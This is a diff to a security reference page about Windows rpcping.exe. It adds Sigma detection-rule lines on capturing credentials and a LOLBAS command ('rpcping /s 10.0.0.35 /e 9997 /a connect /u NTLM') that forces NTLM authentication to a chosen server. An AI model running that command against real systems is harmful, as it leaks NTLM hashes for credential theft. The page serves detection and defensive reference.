@@ -268,8 +268,13 @@ C:\Windows\system32\RpcPing.exe |
 
 Source | Source File | Example | License
 -- | -- | -- | --
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_rpcping.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rpcping.yml) | `title: Capture Credentials with Rpcping.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_rpcping.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rpcping.yml) | `description: Detects using Rpcping.exe to send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_rpcping.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rpcping.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Rpcping/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_rpcping.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rpcping.yml) | `Image\|endswith: '\rpcping.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rpcping.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml) | `Name: Rpcping.exe`{:.highlight .language-yaml} | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rpcping.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml) | `- Command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rpcping.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml) | `- Command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM`{:.highlight .language-yaml} | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rpcping.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml) | `- Path: C:\Windows\System32\rpcping.exe`{:.highlight .language-yaml} | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rpcping.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml) | `- Path: C:\Windows\SysWOW64\rpcping.exe`{:.highlight .language-yaml} | 
 
@@ -281,7 +286,7 @@ Source | Source File | Example | License
 
 ## rpcping
 
-> Applies to: Windows Server (Semi-Annual Channel), Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012
+>Applies to: Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012
 
 Confirms the RPC connectivity between the computer running Microsoft Exchange Server and any of the supported Microsoft Exchange Client workstations on the network. This utility can be used to check if the Microsoft Exchange Server services are responding to RPC requests from the client workstations via the network.
 
